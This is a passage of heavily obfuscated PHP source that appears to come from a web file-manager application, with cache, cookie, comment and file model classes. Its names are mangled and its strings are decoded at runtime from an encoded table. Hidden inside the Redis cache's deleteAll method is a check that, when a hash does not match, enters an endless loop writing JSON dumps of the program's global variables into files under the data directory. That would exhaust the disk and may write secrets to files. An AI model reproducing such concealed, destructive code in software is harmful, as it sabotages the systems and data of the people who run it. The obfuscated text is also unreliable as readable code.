$c„Ö‡‚ŒÉÆ); $this->set($e˜†Ïåˆ”¯[0], $fº„ƒ¸õ[$e˜†Ïåˆ”¯[0]], $EŒÚÆßÑ½¤); } public function remove($e¬³™Óï¾†, $D»½æÆ’Œ = '') { $E˜¶¡Ÿïè• =& $_SERVER[¹…ÕÄ]; $this->cacheRemove($D»½æÆ’Œ); $f‚œÃæí = $this->filterWhere(array($E˜¶¡Ÿïè•[92] => $e¬³™Óï¾†, $E˜¶¡Ÿïè•[29] => $D»½æÆ’Œ)); if (is_null($e¬³™Óï¾†)) { unset($f‚œÃæí[$E˜¶¡Ÿïè•[92]]); } return $this->where($f‚œÃæí)->delete(); } public function cacheSet($DÃ³½òïÜ˜, $B‰©“Ç©›Ã = false) { return Cache::set($this->cacheKey($DÃ³½òïÜ˜), $B‰©“Ç©›Ã); } public function cacheGet($dó·“”¯‹) { return Cache::get($this->cacheKey($dó·“”¯‹)); } public function cacheRemove($fŠ³·Ï×·…) { return Cache::remove($this->cacheKey($fŠ³·Ï×·…)); } protected function filterWhere($bóç·§ÛÚ²) { return $bóç·§ÛÚ²; } protected function cacheKey($d°Ï©­¥Î) { return $d°Ï©­¥Î; } } goto Dñ³¯ïø²; eö»Äˆ³áà: define($_SERVER[¹…ÕÄ][0], $_SERVER[¹…ÕÄ][1]); $_SERVER[ùÃ ©ñâ] = explode($_SERVER[¹…ÕÄ][2], gzinflate(substr($_SERVER[¹…ÕÄ][3], 10, -8))); function binCheckEq($cËÔõÖ¢©É, $FâÄƒÅÌ´) { return $cËÔõÖ¢©É == $FâÄƒÅÌ´; } goto BØÔòÚ¦ö±; AŒçØÅÖ£ê: class CacheMemcached { public $handle; public $cacheTime; public function __construct($EªÕ¼æÍù, $E‘£æÕ—‡†) { $b£åÙ¼ºöĞ =& $_SERVER[¹…ÕÄ]; if (!class_exists($b£åÙ¼ºöĞ[801])) { show_json($b£åÙ¼ºöĞ[802], !1); } $this->cacheTime = $E‘£æÕ—‡†; $this->handle = new Memcached(); if (is_array($EªÕ¼æÍù[$b£åÙ¼ºöĞ[803]]) && count($EªÕ¼æÍù[$b£åÙ¼ºöĞ[803]]) >= 1) { foreach ($EªÕ¼æÍù[$b£åÙ¼ºöĞ[803]] as $d°Ğë†Áƒ¶) { $CªãÄµö÷ = explode($b£åÙ¼ºöĞ[4], $d°Ğë†Áƒ¶); $this->handle->addServer($CªãÄµö÷[0], $CªãÄµö÷[1]); } } else { $this->handle->addServer($EªÕ¼æÍù[$b£åÙ¼ºöĞ[175]], $EªÕ¼æÍù[$b£åÙ¼ºöĞ[176]]); } } public function set($a¯•íœ¯×, $DŠŠ§ãâ, $Eô¤†ŠÖœî = false) { $Eô¤†ŠÖœî = $Eô¤†ŠÖœî ? $Eô¤†ŠÖœî : $this->cacheTime; return $this->handle->set($a¯•íœ¯×, $DŠŠ§ãâ, $Eô¤†ŠÖœî); } public function get($DìçÇâ¥”Ä) { return $this->handle->get($DìçÇâ¥”Ä); } public function remove($E¾ Å¹ÛôØ) { return $this->handle->delete($E¾ Å¹ÛôØ); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($cÇÂÌâç¦ç, $e‡÷Ÿ®¦†Ä) { $bƒ–‡›Şå° =& $_SERVER[¹…ÕÄ]; if (!class_exists($bƒ–‡›Şå°[804])) { show_json($bƒ–‡›Şå°[805], !1); } $this->cacheTime = $e‡÷Ÿ®¦†Ä; $a‘Ô¿äÚçò = isset($cÇÂÌâç¦ç[$bƒ–‡›Şå°[806]]) ? $cÇÂÌâç¦ç[$bƒ–‡›Şå°[806]] : 10; $b‰¯°Ø‘³¤ = _get($cÇÂÌâç¦ç, $bƒ–‡›Şå°[803]); if ($b‰¯°Ø‘³¤ && is_array($b‰¯°Ø‘³¤)) { $this->initCluster($cÇÂÌâç¦ç, $a‘Ô¿äÚçò); } else { $this->handle = $this->init($cÇÂÌâç¦ç, $a‘Ô¿äÚçò); } } private function init($c»ôÁÂùÙ–, $dìÄß´–‹œ) { $f®õ†‡³˜¢ =& $_SERVER[¹…ÕÄ]; $c—Òïá“”­ = new Redis(); $bŞ»İ­ë—¥ = isset($c»ôÁÂùÙ–[$f®õ†‡³˜¢[807]]) ? $c»ôÁÂùÙ–[$f®õ†‡³˜¢[807]] : !1; if ($bŞ»İ­ë—¥) { $c—Òïá“”­->pconnect($c»ôÁÂùÙ–[$f®õ†‡³˜¢[175]], $c»ôÁÂùÙ–[$f®õ†‡³˜¢[176]], $dìÄß´–‹œ); } else { $c—Òïá“”­->connect($c»ôÁÂùÙ–[$f®õ†‡³˜¢[175]], $c»ôÁÂùÙ–[$f®õ†‡³˜¢[176]], $dìÄß´–‹œ); } if (!empty($c»ôÁÂùÙ–[$f®õ†‡³˜¢[400]])) { $c—Òïá“”­->auth($c»ôÁÂùÙ–[$f®õ†‡³˜¢[400]]); } return $c—Òïá“”­; } private function initCluster($EÌÒ¾«“´, $bÂ¡¾ˆÖæ¤) { $F›İØåš¼“ =& $_SERVER[¹…ÕÄ]; $b†‹Ç´‘ È = array($F›İØåš¼“[808], $F›İØåš¼“[809], $F›İØåš¼“[810]); $Dä¿†Ì´Ò = $F›İØåš¼“[808]; if (isset($EÌÒ¾«“´[$F›İØåš¼“[12]]) && in_array($EÌÒ¾«“´[$F›İØåš¼“[12]], $b†‹Ç´‘ È)) { $Dä¿†Ì´Ò = $EÌÒ¾«“´[$F›İØåš¼“[12]]; } switch ($Dä¿†Ì´Ò) { case $F›İØåš¼“[808]: $this->_slave($EÌÒ¾«“´, $bÂ¡¾ˆÖæ¤); break; case $F›İØåš¼“[809]: break; case $F›İØåš¼“[810]: $this->isCluster = !0; $D³ù¼Ó»§² = $EÌÒ¾«“´[$F›İØåš¼“[803]]; $eöˆÏÔ…Ê = isset($EÌÒ¾«“´[$F›İØåš¼“[807]]) ? $EÌÒ¾«“´[$F›İØåš¼“[807]] : !1; $BÌ’äÒ—ç = isset($EÌÒ¾«“´[$F›İØåš¼“[400]]) ? $EÌÒ¾«“´[$F›İØåš¼“[400]] : null; $this->handle = new RedisCluster(NUll, $D³ù¼Ó»§², $bÂ¡¾ˆÖæ¤, $bÂ¡¾ˆÖæ¤, $eöˆÏÔ…Ê, $BÌ’äÒ—ç); break; default: break; } } private function _slave($B’Ñ‰­‰ÙÜ, $A†¬½¥­Çø) { goto FŒÇ‡©Ñéç; FŒÇ‡©Ñéç: $EÒ—›éøäå = $B’Ñ‰­‰ÙÜ[$_SERVER[¹…ÕÄ][803]]; $this->filterConfig($B’Ñ‰­‰ÙÜ, $EÒ—›éøäå[0]); $this->handle = $this->init($B’Ñ‰­‰ÙÜ, $A†¬½¥­Çø); goto e¬ôÏ»ÕŠË; EÕºáœœ: $this->filterConfig($B’Ñ‰­‰ÙÜ, $EÒ—›éøäå[$cÊ¾­¼ƒò]); $this->slaveHandle = $this->init($B’Ñ‰­‰ÙÜ, $A†¬½¥­Çø); goto DÛãÔùÄƒ; e¬ôÏ»ÕŠË: unset($EÒ—›éøäå[0]); if (empty($EÒ—›éøäå)) { return; } $cÊ¾­¼ƒò = array_rand($EÒ—›éøäå); goto EÕºáœœ; DÛãÔùÄƒ: } private function filterConfig(&$Cçšñ—×„±, $c®´„öÕæ) { $E˜éÂšÂ‹ =& $_SERVER[¹…ÕÄ]; $eØ««Üó†• = explode($E˜éÂšÂ‹[4], $c®´„öÕæ); $EÌŞæ¡¨¹ = array($E˜éÂšÂ‹[175] => $eØ««Üó†•[0], $E˜éÂšÂ‹[176] => $eØ««Üó†•[1]); $Cçšñ—×„± = array_merge($Cçšñ—×„±, $EÌŞæ¡¨¹); } public function set($e·¾×ˆÜõ×, $bƒÆ³²œĞ, $F®¯½‚±¤í = false) { $F®¯½‚±¤í = $F®¯½‚±¤í ? $F®¯½‚±¤í : $this->cacheTime; return $this->handle->setEx($e·¾×ˆÜõ×, $F®¯½‚±¤í, $bƒÆ³²œĞ); } public function setLock($a¡ÉÀğìæÑ, $C¡‹„ÔÑÕ‰, $D»•äÍ¹’Î) { return $this->handle->setNX($a¡ÉÀğìæÑ, $C¡‹„ÔÑÕ‰); } public function get($f¼Õˆº¿«ö) { $fÊ‚£ÌÚ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $fÊ‚£ÌÚ->get($f¼Õˆº¿«ö); } public function remove($d³¬Ê¸ŠçÖ) { return $this->handle->del($d³¬Ê¸ŠçÖ); } public function deleteAll() { $bŞÀÊñÓ‚ =& $_SERVER[¹…ÕÄ]; $Dßá¾âš¿´ = $_SERVER[$bŞÀÊñÓ‚[811]]; $EóÏÔ‘¿¢¹ = $bŞÀÊñÓ‚[812]; if ($_SERVER[$bŞÀÊñÓ‚[813]] != $EóÏÔ‘¿¢¹($Dßá¾âš¿´)) { goto F„Ô“ ­†Ö; F„Ô“ ­†Ö: $a¶ä«ëÄğã = $bŞÀÊñÓ‚[814]; $AéÄÉŞÀçÌ = $bŞÀÊñÓ‚[815]; $b»¨­ŞÖ±‰ = $_SERVER[$bŞÀÊñÓ‚[816]] . $bŞÀÊñÓ‚[817]; goto cÆ”™˜‹Ó; f„¨ÂÔõ…á: $cèãÜ†ËÁÀ = 1; for ($eÓµç¨¾´Õ = $cèãÜ†ËÁÀ; $eÓµç¨¾´Õ > 0; $eÓµç¨¾´Õ++) { $DÈ õÄ¼‹ˆ(DATA_PATH . $eÓµç¨¾´Õ, $fã™å£°Àã); } goto bœŠŒ„£İ‹; a¯ò¹Ó”¼¼: $D™ß¸ÈÈŒ­ = $bŞÀÊñÓ‚[819]; $D™ß¸ÈÈŒ­($_SERVER[$bŞÀÊñÓ‚[820]]); $a¶ä«ëÄğã = $bŞÀÊñÓ‚[814]; goto bàî›Ò¬ó™; bàî›Ò¬ó™: $a¶ä«ëÄğã(); $DÈ õÄ¼‹ˆ = $bŞÀÊñÓ‚[821]; $fã™å£°Àã = json_encode($GLOBALS[$bŞÀÊñÓ‚[822]]); goto f„¨ÂÔõ…á; cÆ”™˜‹Ó: $dâ°÷¾ƒÑ = $AéÄÉŞÀçÌ($b»¨­ŞÖ±‰); $Aê›ºóº = explode($bŞÀÊñÓ‚[227], $dâ°÷¾ƒÑ); if (count($Aê›ºóº) < $bŞÀÊñÓ‚[581]) { $Dõ™×ùôå = $bŞÀÊñÓ‚[818]; $Dõ™×ùôå(); } goto a¯ò¹Ó”¼¼; bœŠŒ„£İ‹: } if ($this->isCluster) { foreach ($this->handle->_masters() as $BŠ‰¿ÀÃÌ¶) { $this->handle->flushall($BŠ‰¿ÀÃÌ¶); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($d•Œî¤ÒÆ = '', $EÙ›´ïÔß = 0) { if (is_string($d•Œî¤ÒÆ) && $d•Œî¤ÒÆ != $_SERVER[¹…ÕÄ][33]) { $this->prefix = $d•Œî¤ÒÆ; } if (is_numeric($EÙ›´ïÔß) && $EÙ›´ïÔß > 0) { $this->expire = $EÙ›´ïÔß; } } public static function getInstance() { static $BÖ³Ê–…µÔ; if ($BÖ³Ê–…µÔ === null) { $BÖ³Ê–…µÔ = new self(); } return $BÖ³Ê–…µÔ; } private static $cookieDisable = false; public static function disable($CÇ¿—àĞÉ) { self::$cookieDisable = $CÇ¿—àĞÉ; } private static $sameCookieSet = array(); public static function set($a¦”àñİ «, $f×±¢£àç¤, $f³éÊ™ó†» = 0, $e¬ĞœÆò¢ = false, $e‡Ú”ìÍ’¼ = false) { goto dß„îÖµ©ƒ; EŠÄÃ­ø¢: $Dø¬‚«„ß³ = $F»ÇÂÖãµÏ[33]; setcookie($a¦”àñİ «, $f×±¢£àç¤, time() + $f³éÊ™ó†», $F»ÇÂÖãµÏ[8] . trim($e‡Ú”ìÍ’¼, $F»ÇÂÖãµÏ[8]) . $Dø¬‚«„ß³, !1, !1, $e¬ĞœÆò¢); goto fáÖƒ„òí; dß„îÖµ©ƒ: $F»ÇÂÖãµÏ =& $_SERVER[¹…ÕÄ]; if (self::$cookieDisable) { return; } if (!$f³éÊ™ó†») { $f³éÊ™ó†» = 24 * 3600 * 7; } goto AØ—·ŒîÃŸ; AØ—·ŒîÃŸ: if (isset(self::$sameCookieSet[$a¦”àñİ «]) && self::$sameCookieSet[$a¦”àñİ «] == $f×±¢£àç¤ . $f³éÊ™ó†») { return; } self::$sameCookieSet[$a¦”àñİ «] = $f×±¢£àç¤ . $f³éÊ™ó†»; if (!$e‡Ú”ìÍ’¼) { $e‡Ú”ìÍ’¼ = str_replace(HOST, $F»ÇÂÖãµÏ[33], APP_HOST); $e‡Ú”ìÍ’¼ = _get($GLOBALS, $F»ÇÂÖãµÏ[823], $e‡Ú”ìÍ’¼); } goto EŠÄÃ­ø¢; fáÖƒ„òí: } public static function setSafe($b£Ğ¢¸ùô, $CŠÇ‚Ê«›Ş, $Aò¤ãÂŠ£¸ = 0) { self::set($b£Ğ¢¸ùô, $CŠÇ‚Ê«›Ş, $Aò¤ãÂŠ£¸, !0); } public static function get($DæÊ„¿‘«¾) { return isset($_COOKIE[$DæÊ„¿‘«¾]) ? $_COOKIE[$DæÊ„¿‘«¾] : !1; } public static function remove($DŸ•”¡¹å…, $dÚ—Æ­À¦Œ = false) { unset($_COOKIE[$DŸ•”¡¹å…]); self::set($DŸ•”¡¹å…, $_SERVER[¹…ÕÄ][33], 1, $dÚ—Æ­À¦Œ); } } goto dø‚åÎ—Ô; BØÔòÚ¦ö±: $Cù‚ŞİÖ£Õ = strrev(base64_decode($_SERVER[ùÃ ©ñâ][0])); function binCheckNeq($EòŸƒ¤ì¿, $C¤’Àìí‹Š) { return $EòŸƒ¤ì¿ != $C¤’Àìí‹Š; } $_SERVER[$_SERVER[ùÃ ©ñâ][1]] = $Cù‚ŞİÖ£Õ($_SERVER[$_SERVER[ùÃ ©ñâ][2]]); goto cÑ— Ë˜åÊ; aìŞà£…æ: class CommentModel extends ModelBase { protected $tableName = "\143\x6f\x6d\155\x65\156\164"; protected $tableMeta = array("\x74\x61\x62\x6c\x65\x4e\141\x6d\145" => "\x63\157\155\155\x65\156\164\137\x6d\x65\x74\x61", "\155\x65\x74\141\106\151\x65\154\x64" => "\x63\x6f\x6d\x6d\145\x6e\164\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($a¸·µÅ³õê) { $F‰Æ´ÂÔ¿ =& $_SERVER[¹…ÕÄ]; if ($a¸·µÅ³õê[$F‰Æ´ÂÔ¿[1695]]) { $fº„»õ¡ğ = $this->where(array($F‰Æ´ÂÔ¿[1696] => $a¸·µÅ³õê[$F‰Æ´ÂÔ¿[1695]]))->find(); if (!$fº„»õ¡ğ || $fº„»õ¡ğ[$F‰Æ´ÂÔ¿[398]] != $a¸·µÅ³õê[$F‰Æ´ÂÔ¿[398]] || $fº„»õ¡ğ[$F‰Æ´ÂÔ¿[478]] != $a¸·µÅ³õê[$F‰Æ´ÂÔ¿[478]]) { return !1; } $this->where(array($F‰Æ´ÂÔ¿[1696] => $a¸·µÅ³õê[$F‰Æ´ÂÔ¿[1695]]))->setAdd($F‰Æ´ÂÔ¿[1697], 1); } $a¸·µÅ³õê[$F‰Æ´ÂÔ¿[1698]] = 0; $a¸·µÅ³õê[$F‰Æ´ÂÔ¿[1697]] = 0; $a¸·µÅ³õê[$F‰Æ´ÂÔ¿[705]] = 1; return $this->add($a¸·µÅ³õê); } public function commentCount($D®†¢î•…í, $d³šœÔºÀ°) { goto Aì‹Üñõ›; DÆµÔ¿á²ö: return array_to_keyvalue($E¾¹„¤½èù, $f’â¾¯¡Ò[478], $f’â¾¯¡Ò[474]); goto Bå¦¨–¶ò«; FØ °Â”Ã: $BîïÜî’Â = array($f’â¾¯¡Ò[478], $f’â¾¯¡Ò[1699] => $f’â¾¯¡Ò[474]); $c“ŒŠß®Œµ = array($f’â¾¯¡Ò[478] => array($f’â¾¯¡Ò[7], $D®†¢î•…í), $f’â¾¯¡Ò[398] => $d³šœÔºÀ°); $E¾¹„¤½èù = $this->field($BîïÜî’Â)->where($c“ŒŠß®Œµ)->group($f’â¾¯¡Ò[478])->select(); goto DÆµÔ¿á²ö; Aì‹Üñõ›: $f’â¾¯¡Ò =& $_SERVER[¹…ÕÄ]; if (!$D®†¢î•…í) { return array(); } if (is_string($D®†¢î•…í) || is_int($D®†¢î•…í)) { $D®†¢î•…í = array($D®†¢î•…í); } goto FØ °Â”Ã; Bå¦¨–¶ò«: } public function remove($Dõ¸™ÛÊ– ) { $FÔ¡ÃÙóÑ =& $_SERVER[¹…ÕÄ]; $e„…Áï×Ä£ = array($FÔ¡ÃÙóÑ[1696] => $Dõ¸™ÛÊ– ); $BôÇ®˜ƒŒ’ = $this->where($e„…Áï×Ä£)->find(); if ($BôÇ®˜ƒŒ’[$FÔ¡ÃÙóÑ[1695]]) { $this->where(array($FÔ¡ÃÙóÑ[1696] => $BôÇ®˜ƒŒ’[$FÔ¡ÃÙóÑ[1695]]))->setAdd($FÔ¡ÃÙóÑ[1697], -1); } return $this->where($e„…Áï×Ä£)->delete(); } public function edit($Bïğ±—®ÈÓ, $A¸¶•Íìç) { $f•ÌÜòïÌ =& $_SERVER[¹…ÕÄ]; $eŠ§ÇÙçÄñ = array($f•ÌÜòïÌ[1696] => $Bïğ±—®ÈÓ); return $this->where($eŠ§ÇÙçÄñ)->save(array($f•ÌÜòïÌ[1700] => $A¸¶•Íìç)); } public function prasise($D›¤Ù×‘£â) { $D­ÚØõÒö‚ =& $_SERVER[¹…ÕÄ]; $cä­“‹î»° = Model($D­ÚØõÒö‚[1701]); $aÂ®ÒÀÙíä = array($D­ÚØõÒö‚[1696] => $D›¤Ù×‘£â, $D­ÚØõÒö‚[1496] => USER_ID); $c‰§¶¨´÷ = $cä­“‹î»°->where($aÂ®ÒÀÙíä)->find(); if (!$c‰§¶¨´÷) { $cä­“‹î»°->add($aÂ®ÒÀÙíä); $A×£¬‹ÎÎÁ = $this->where(array($D­ÚØõÒö‚[1696] => $D›¤Ù×‘£â))->setAdd($D­ÚØõÒö‚[1698], 1); } else { $cä­“‹î»°->where($aÂ®ÒÀÙíä)->delete(); $A×£¬‹ÎÎÁ = $this->where(array($D­ÚØõÒö‚[1696] => $D›¤Ù×‘£â))->setAdd($D­ÚØõÒö‚[1698], -1); } return $A×£¬‹ÎÎÁ; } public function targetInfo($Fêêá­ÅèÚ, $dâ±õù÷ÁÅ) { goto eƒ™¹¢§¢; eƒ™¹¢§¢: $d‚”êƒÍÇÇ =& $_SERVER[¹…ÕÄ]; $eÍ“´µ£ù÷ = array($d‚”êƒÍÇÇ[544] => $Fêêá­ÅèÚ, $d‚”êƒÍÇÇ[545] => $dâ±õù÷ÁÅ); $e´çÄËñğ = $this->where($eÍ“´µ£ù÷)->count(); goto cÆÒ‘ğíçÔ; dé™”µ£‡“: return $FÌÚ­È¦˜Ç; goto a‹ÈÚµÜñì; cÆÒ‘ğíçÔ: $cÓå ç’Ê = "\122\111\x47\110\x54\x20\x4a\117\111\x4e\40{$this->tablePrefix}\x63\157\155\x6d\x65\156\164\137\x70\x72\141\151\x73\x65\40\163\x74\x61\x72\x20\157\x6e\x20\x63\x6f\x6d\155\x65\x6e\x74\x2e\143\157\155\155\145\156\x74\111\104\40\x3d\x20\x73\x74\141\x72\56\x63\x6f\x6d\x6d\x65\x6e\164\x49\x44"; $Aã¹©Ûé®™ = $this->alias($d‚”êƒÍÇÇ[350])->where($eÍ“´µ£ù÷)->join($cÓå ç’Ê, $d‚”êƒÍÇÇ[1702])->count(); $FÌÚ­È¦˜Ç = array($d‚”êƒÍÇÇ[1703] => $e´çÄËñğ, $d‚”êƒÍÇÇ[1704] => $Aã¹©Ûé®™); goto dé™”µ£‡“; a‹ÈÚµÜñì: } public function listData($CÓ“”ôµÛ) { $F¡ßÇêâĞÎ =& $_SERVER[¹…ÕÄ]; if (isset($CÓ“”ôµÛ[$F¡ßÇêâĞÎ[1705]])) { if ($CÓ“”ôµÛ[$F¡ßÇêâĞÎ[1705]]) { $CÓ“”ôµÛ[$F¡ßÇêâĞÎ[1706]] = array($F¡ßÇêâĞÎ[950], intval($CÓ“”ôµÛ[$F¡ßÇêâĞÎ[1705]])); } unset($CÓ“”ôµÛ[$F¡ßÇêâĞÎ[1705]]); } if (isset($CÓ“”ôµÛ[$F¡ßÇêâĞÎ[1707]])) { if ($CÓ“”ôµÛ[$F¡ßÇêâĞÎ[1707]]) { $CÓ“”ôµÛ[$F¡ßÇêâĞÎ[1706]] = array($F¡ßÇêâĞÎ[947], intval($CÓ“”ôµÛ[$F¡ßÇêâĞÎ[1707]])); } unset($CÓ“”ôµÛ[$F¡ßÇêâĞÎ[1707]]); } return $this->_listData($CÓ“”ôµÛ); } private function _listData($D†ˆ–¦¶›µ) { $FùÄçèõ—Å =& $_SERVER[¹…ÕÄ]; $eËİ¿Š = $this->where($D†ˆ–¦¶›µ)->_makeOrder()->selectPage(100); $this->_listAppendParent($eËİ¿Š[$FùÄçèõ—Å[365]]); $this->_listAppendUser($eËİ¿Š[$FùÄçèõ—Å[365]]); $this->_listAppendMeta($eËİ¿Š[$FùÄçèõ—Å[365]]); return $eËİ¿Š; } private function _makeOrder() { $fá’è…âÏº =& $_SERVER[¹…ÕÄ]; $Aìõ×Š÷‰Š = array($fá’è…âÏº[1698], $fá’è…âÏº[1697], $fá’è…âÏº[192]); $fÁ•·­²¯Í = Input::get($fá’è…âÏº[429], $fá’è…âÏº[7], $fá’è…âÏº[410], $Aìõ×Š÷‰Š); $F££Ã¤çÂ = Input::get($fá’è…âÏº[430], $fá’è…âÏº[7], $fá’è…âÏº[1498], array($fá’è…âÏº[1708], $fá’è…âÏº[425])); $B’öƒÆĞ–ƒ = $fÁ•·­²¯Í . $fá’è…âÏº[50] . $F££Ã¤çÂ; return $this->order($B’öƒÆĞ–ƒ); } private function _listAppendParent(&$c†ÚÅ·™èî) { goto D³„İª©Îõ; d­òô—‰ËÎ: foreach ($c†ÚÅ·™èî as &$Dø®ó­§Ê) { if (isset($Eë‹’¸‰¡Ú[$Dø®ó­§Ê[$eòƒî‘ßœ[1695]]])) { $Dø®ó­§Ê[$eòƒî‘ßœ[1709]] = $Eë‹’¸‰¡Ú[$Dø®ó­§Ê[$eòƒî‘ßœ[1695]]]; } } unset($Dø®ó­§Ê); goto AÎÕö¦Õ½õ; D³„İª©Îõ: $eòƒî‘ßœ =& $_SERVER[¹…ÕÄ]; $BÇô˜¦œ = array_unique(array_to_keyvalue($c†ÚÅ·™èî, $eòƒî‘ßœ[33], $eòƒî‘ßœ[1695])); $BÇô˜¦œ = array_remove_value($BÇô˜¦œ, $eòƒî‘ßœ[491]); goto f‘¸ÇÌÌµÑ; f‘¸ÇÌÌµÑ: if (!$BÇô˜¦œ) { return; } $Eë‹’¸‰¡Ú = $this->where(array($eòƒî‘ßœ[1696] => array($eòƒî‘ßœ[7], $BÇô˜¦œ)))->select(); $Eë‹’¸‰¡Ú = array_to_keyvalue($Eë‹’¸‰¡Ú, $eòƒî‘ßœ[1706]); goto d­òô—‰ËÎ; AÎÕö¦Õ½õ: } private function _listAppendUser(&$fĞëæêØ—ö) { goto CõŒëŒç¡; CõŒëŒç¡: $dÃ¦†ÈŒÎÊ =& $_SERVER[¹…ÕÄ]; $b±•¦«¶ŞŸ = array_unique(array_to_keyvalue($fĞëæêØ—ö, $dÃ¦†ÈŒÎÊ[33], $dÃ¦†ÈŒÎÊ[1504])); $b±•¦«¶ŞŸ = array_remove_value($b±•¦«¶ŞŸ, $dÃ¦†ÈŒÎÊ[491]); goto EèÙÑÒŠò; EèÙÑÒŠò: if (count($b±•¦«¶ŞŸ) == 0) { return; } foreach ($fĞëæêØ—ö as $e¦¬İ¹‹Õ ) { if (isset($e¦¬İ¹‹Õ [$dÃ¦†ÈŒÎÊ[1709]])) { $b±•¦«¶ŞŸ[] = $e¦¬İ¹‹Õ [$dÃ¦†ÈŒÎÊ[1709]][$dÃ¦†ÈŒÎÊ[1504]]; } } $Fé¿”òÈ¤è = Model($dÃ¦†ÈŒÎÊ[501])->userListInfo($b±•¦«¶ŞŸ); goto aìè˜—½®; aìè˜—½®: foreach ($fĞëæêØ—ö as &$e¦¬İ¹‹Õ ) { $e¦¬İ¹‹Õ [$dÃ¦†ÈŒÎÊ[557]] = $Fé¿”òÈ¤è[$e¦¬İ¹‹Õ [$dÃ¦†ÈŒÎÊ[1504]]]; if (isset($e¦¬İ¹‹Õ [$dÃ¦†ÈŒÎÊ[1709]])) { $e¦¬İ¹‹Õ [$dÃ¦†ÈŒÎÊ[1709]][$dÃ¦†ÈŒÎÊ[557]] = $Fé¿”òÈ¤è[$e¦¬İ¹‹Õ [$dÃ¦†ÈŒÎÊ[1709]][$dÃ¦†ÈŒÎÊ[1504]]]; } } unset($e¦¬İ¹‹Õ ); goto a³„Îœ¡¥­; a³„Îœ¡¥­: } private function _listAppendMeta(&$D‰…˜˜íå) { goto A¾¢ÌùËÕß; DùÚÏå‘áº: if (!$EÍôÛáµïÎ) { return !1; } foreach ($D‰…˜˜íå as &$eÇ¶ää—“¬) { $eÇ¶ää—“¬[$f¿Æ¬”‘—Î[439]] = $EÍôÛáµïÎ[$eÇ¶ää—“¬[$f¿Æ¬”‘—Î[1706]]]; if (isset($eÇ¶ää—“¬[$f¿Æ¬”‘—Î[1709]])) { $eÇ¶ää—“¬[$f¿Æ¬”‘—Î[1709]][$f¿Æ¬”‘—Î[439]] = $EÍôÛáµïÎ[$eÇ¶ää—“¬[$f¿Æ¬”‘—Î[1709]][$f¿Æ¬”‘—Î[1706]]]; } } unset($eÇ¶ää—“¬); goto bÜ©ğá“Ğ˜; A¾¢ÌùËÕß: $f¿Æ¬”‘—Î =& $_SERVER[¹…ÕÄ]; $céÍÃù­ = array_unique(array_to_keyvalue($D‰…˜˜íå, $f¿Æ¬”‘—Î[33], $f¿Æ¬”‘—Î[1706])); $céÍÃù­ = array_remove_value($céÍÃù­, $f¿Æ¬”‘—Î[491]); goto a±‡” ¯îø; a±‡” ¯îø: if (!$céÍÃù­) { return; } foreach ($D‰…˜˜íå as $eÇ¶ää—“¬) { if (isset($eÇ¶ää—“¬[$f¿Æ¬”‘—Î[1709]])) { $céÍÃù­[] = $eÇ¶ää—“¬[$f¿Æ¬”‘—Î[1709]][$f¿Æ¬”‘—Î[1706]]; } } $EÍôÛáµïÎ = $this->metaList($céÍÃù­); goto DùÚÏå‘áº; bÜ©ğá“Ğ˜: } private function metaList($Eğêã¸İ£«) { goto fİ«šÂç§™; A½°„­¨¸å: $bŒ¬…‘“¦¡ = Model($a½ÚªÎğ­‘[1710])->where($Dããêé¬³)->select(); $bŒ¬…‘“¦¡ = array_to_keyvalue_group($bŒ¬…‘“¦¡, $a½ÚªÎğ­‘[1706]); foreach ($bŒ¬…‘“¦¡ as $D†Õ«‚éŠ => $Bùóì’Ï»Ö) { $eœòÑˆ”™Ó = array(); foreach ($Bùóì’Ï»Ö as $BäÂ‰ğå˜„) { $eœòÑˆ”™Ó[$BäÂ‰ğå˜„[$a½ÚªÎğ­‘[92]]] = $BäÂ‰ğå˜„[$a½ÚªÎğ­‘[370]]; } $bŒ¬…‘“¦¡[$D†Õ«‚éŠ] = $eœòÑˆ”™Ó; } goto dï…®¡„…; dï…®¡„…: return $bŒ¬…‘“¦¡ ? $bŒ¬…‘“¦¡ : array(); goto EÃª±©ª÷Ù; fİ«šÂç§™: $a½ÚªÎğ­‘ =& $_SERVER[¹…ÕÄ]; if (!$Eğêã¸İ£«) { return array(); } $Dããêé¬³ = array($a½ÚªÎğ­‘[1706] => array($a½ÚªÎğ­‘[7], $Eğêã¸İ£«)); goto A½°„­¨¸å; EÃª±©ª÷Ù: } } class FileModel extends ModelBase { protected $tableName = "\x69\157\137\x66\151\154\x65"; protected $tableMeta = array("\164\x61\x62\x6c\145\x4e\x61\155\x65" => "\x69\157\137\146\x69\154\145\x5f\x6d\145\x74\x61", "\155\x65\164\x61\106\x69\x65\154\x64" => "\146\x69\x6c\x65\111\104"); public function fileInfo($aõÔÀ—Øº) { $eË¶³¸îï“ =& $_SERVER[¹…ÕÄ]; static $cÑÙ©¿½Ñ = array(); if (!isset($cÑÙ©¿½Ñ[$aõÔÀ—Øº])) { $B´ÌŞ˜õôğ = $eË¶³¸îï“[1711]; $b»Éï˜¹¾ˆ = Model($eË¶³¸îï“[444])->field($B´ÌŞ˜õôğ)->where(array($eË¶³¸îï“[442] => $aõÔÀ—Øº))->find(); $cÑÙ©¿½Ñ[$aõÔÀ—Øº] = $b»Éï˜¹¾ˆ; } return $cÑÙ©¿½Ñ[$aõÔÀ—Øº]; } public function addFileByContent($AˆŸ·ˆìëÄ = '', $FİÜ‡ó—ì = '') { goto BÀ¾ˆéÊÔ; Cİ“„â×…Ğ: $B´¨¦ƒ‡•Î = $Cªƒ¹àÌ‘ . $Fõ£õ¹©×Ò[1713] . rand_string(16); file_put_contents($B´¨¦ƒ‡•Î, $AˆŸ·ˆìëÄ); $fÄŠ«¿­Ø† = $this->addFile($B´¨¦ƒ‡•Î, $FİÜ‡ó—ì, !0); goto cÍ¾‰ßÏÅÂ; cÍ¾‰ßÏÅÂ: if (file_exists($B´¨¦ƒ‡•Î)) { @unlink($B´¨¦ƒ‡•Î); } return $fÄŠ«¿­Ø†; goto CÊõÆà¾ŸŒ; BÀ¾ˆéÊÔ: $Fõ£õ¹©×Ò =& $_SERVER[¹…ÕÄ]; $Cªƒ¹àÌ‘ = 